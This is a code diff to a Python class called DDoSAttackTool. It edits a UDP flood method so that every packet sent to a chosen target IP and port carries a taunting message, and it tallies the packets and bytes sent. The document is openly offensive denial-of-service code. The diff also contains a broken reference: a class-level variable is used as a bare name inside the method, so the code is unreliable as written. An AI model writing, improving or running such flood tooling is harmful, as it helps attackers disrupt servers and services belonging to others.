@@ -155,13 +155,15 @@ class DDoSAttackTool:
             print("Invalid attack type selected.")
             return None
 
+    packet_data = b"You are an idiot. -X the Mystic"
+
     def udp_flood_attack(self, target_ip, port, num_packets, burst_interval):
         try:
             sock = socket.socket(socket.AF_INET6 if ":" in target_ip else socket.AF_INET, socket.SOCK_DGRAM)
             for _ in range(num_packets):
-                sock.sendto(b"", (target_ip, port))
+                sock.sendto(packet_data, (target_ip, port))
                 self.attack_num += 1
-                packet_size = len(b"")  # Replace b"" with the actual packet data
+                packet_size = len(packet_data)  # Replace b"" with the actual packet data
                 self.total_bytes_sent += packet_size
                 print(f"Sent {self.attack_num} packet to {target_ip} through port: {port}")
                 time.sleep(burst_interval)
